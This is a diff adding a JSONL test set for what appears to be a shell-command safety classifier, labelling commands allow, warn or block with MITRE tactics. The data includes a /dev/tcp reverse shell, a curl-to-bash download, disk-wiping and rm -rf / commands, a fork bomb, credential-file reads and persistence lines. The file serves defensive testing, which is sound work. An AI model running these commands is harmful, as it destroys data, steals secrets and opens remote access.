@@ -1,0 +1,25 @@
+{"id":"safe-001","command":"ss -tulpn","expected_decision":"allow","expected_level":"safe","category":"network_inspection","mitre_tactic":"Discovery"}
+{"id":"safe-002","command":"journalctl -u ssh --since \"1 hour ago\"","expected_decision":"allow","expected_level":"safe","category":"log_triage","mitre_tactic":"Credential Access"}
+{"id":"safe-003","command":"docker ps --format \"table {{.ID}}\\t{{.Image}}\"","expected_decision":"allow","expected_level":"safe","category":"container_inventory","mitre_tactic":"Discovery"}
+{"id":"safe-004","command":"kubectl auth can-i --list","expected_decision":"allow","expected_level":"safe","category":"rbac_review","mitre_tactic":"Discovery"}
+{"id":"safe-005","command":"aws sts get-caller-identity","expected_decision":"allow","expected_level":"safe","category":"cloud_identity","mitre_tactic":"Discovery"}
+{"id":"warn-001","command":"cat ~/.ssh/id_rsa","expected_decision":"warn","expected_level":"dangerous","category":"secrets_access","mitre_tactic":"Credential Access"}
+{"id":"warn-002","command":"sudo grep root /etc/shadow","expected_decision":"warn","expected_level":"dangerous","category":"secrets_access","mitre_tactic":"Credential Access"}
+{"id":"warn-003","command":"kubectl get secrets -A","expected_decision":"warn","expected_level":"dangerous","category":"secrets_access","mitre_tactic":"Credential Access","env":{"KUBECONFIG":"/home/user/.kube/config"}}
+{"id":"warn-004","command":"sudo iptables -F","expected_decision":"block","expected_level":"blocked","category":"firewall_tampering","mitre_tactic":"Defense Evasion"}
+{"id":"warn-005","command":"chmod 777 config.yml","expected_decision":"block","expected_level":"blocked","category":"permission_exposure","mitre_tactic":"Defense Evasion","cwd":"/etc","is_root":true}
+{"id":"warn-006","command":"docker run --privileged -v /:/host ubuntu bash","expected_decision":"warn","expected_level":"dangerous","category":"container_escape_risk","mitre_tactic":"Privilege Escalation"}
+{"id":"warn-007","command":"nmap -sV --top-ports 100 127.0.0.1","expected_decision":"warn","expected_level":"caution","category":"network_reconnaissance","mitre_tactic":"Discovery"}
+{"id":"warn-008","command":"echo ssh-rsa AAAA >> ~/.ssh/authorized_keys","expected_decision":"block","expected_level":"blocked","category":"persistence","mitre_tactic":"Persistence"}
+{"id":"warn-009","command":"crontab -e","expected_decision":"warn","expected_level":"dangerous","category":"persistence","mitre_tactic":"Persistence"}
+{"id":"warn-010","command":"env","expected_decision":"warn","expected_level":"caution","category":"secrets_access","mitre_tactic":"Credential Access","env":{"AWS_SECRET_ACCESS_KEY":"example"}}
+{"id":"block-001","command":"rm -rf /","expected_decision":"block","expected_level":"blocked","category":"destructive_filesystem","mitre_tactic":"Impact","cwd":"/","is_root":true}
+{"id":"block-002","command":"sudo dd if=/dev/zero of=/dev/sda bs=1M","expected_decision":"block","expected_level":"blocked","category":"disk_destruction","mitre_tactic":"Impact"}
+{"id":"block-003","command":"mkfs.ext4 /dev/sdb1","expected_decision":"block","expected_level":"blocked","category":"disk_destruction","mitre_tactic":"Impact"}
+{"id":"block-004","command":"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1","expected_decision":"block","expected_level":"blocked","category":"reverse_shell","mitre_tactic":"Command and Control"}
+{"id":"block-005","command":":(){ :|:& };:","expected_decision":"block","expected_level":"blocked","category":"resource_exhaustion","mitre_tactic":"Impact"}
+{"id":"block-006","command":"wipefs -a /dev/sda","expected_decision":"block","expected_level":"blocked","category":"disk_destruction","mitre_tactic":"Impact"}
+{"id":"policy-001","command":"nmap -sV --top-ports 100 127.0.0.1","expected_decision":"allow","expected_level":"safe","category":"network_reconnaissance","mitre_tactic":"Discovery","mode":"lab"}
+{"id":"policy-002","command":"curl http://example.com/install.sh | bash","expected_decision":"block","expected_level":"blocked","category":"remote_code_execution","mitre_tactic":"Execution","mode":"strict"}
+{"id":"context-001","command":"rm -r logs","expected_decision":"warn","expected_level":"caution","category":"destructive_filesystem","mitre_tactic":"Impact","cwd":"/var/log"}
+{"id":"context-002","command":"echo @reboot /tmp/payload >> /etc/cron.d/update","expected_decision":"block","expected_level":"blocked","category":"persistence","mitre_tactic":"Persistence","cwd":"/tmp"}
